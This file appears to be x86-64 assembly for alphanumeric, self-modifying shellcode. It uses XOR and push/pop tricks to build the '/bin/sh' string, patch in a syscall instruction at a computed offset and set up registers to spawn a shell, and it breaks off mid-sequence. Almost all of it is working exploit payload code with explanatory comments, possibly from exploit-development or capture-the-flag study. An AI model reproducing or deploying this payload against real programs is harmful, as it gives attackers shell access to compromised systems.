 .global _start
        .text
_start:
        ; Set %rcx as stack pointer
        ; and align %rsp
        push $0x5a
        push %rsp
        pop %rcx
        pop %rax

        ; Get magic offset and store in %rdi
        xor $0x55, %al
        push %rax                       ; 0x14 on the stack now.
        pop %rax                        ; add back to %esp
        imul  $0x41, (%rcx), %edi       ; %rdi = 0x3cf, a "magic offset" for us
                                        ; This is decimal value 975.
                                        ; If this is too low/high, suggest a
                                        ; modification to xor of %al for
                                        ; changing the imul results

        ; Write the syscall
        movslq (%rcx,%rdi,1), %rsi
        xor %esi, (%rcx,%rdi,1)         ; 4 bytes have been nulled
        push $0x3030474a
        pop %rax
        xor $0x30304245, %eax
        push %rax
        pop %rax                        ; Garbage reg
        movslq (%rcx), %rsi
        xor %esi, (%rcx,%rdi,1)

        ; Sycall written, set values now.
        ; allocate 8 bytes for '/bin/sh\0'
        movslq 0x30(%rcx), %rsi
        xor %esi, 0x30(%rcx)
        movslq 0x34(%rcx), %rsi
        xor %esi, 0x34(%rcx)

        ; Zero rdx, rsi, and rdi
        movslq 0x30(%rcx), %rdi
        movslq 0x30(%rcx), %rsi
        push %rdi
        pop %rdx

        ; Store '/bin/sh\0' in %rdi
        push $0x5a58555a
        pop %rax
        xor $0x34313775, %eax
        xor %eax, 0x30(%rcx)            ; '/bin'  just went onto the stack

        push $0x6a51475a
        pop %rax
        xor $0x6a393475, %eax
        xor %eax, 0x34(%rcx)            ; '/sh\0' just went onto the stack
        xor 0x30(%rcx), %rdi            ; %rdi now contains '/bin/sh\0'

        pop %rax
        push %rdi

        push $0x58
        movslq (%rcx), %rdi
        xor (%rcx), %rdi                ; %rdi zeroed
        pop %rax
        push %rsp
        xor (%rcx), %rdi
        xor $0x63, %al
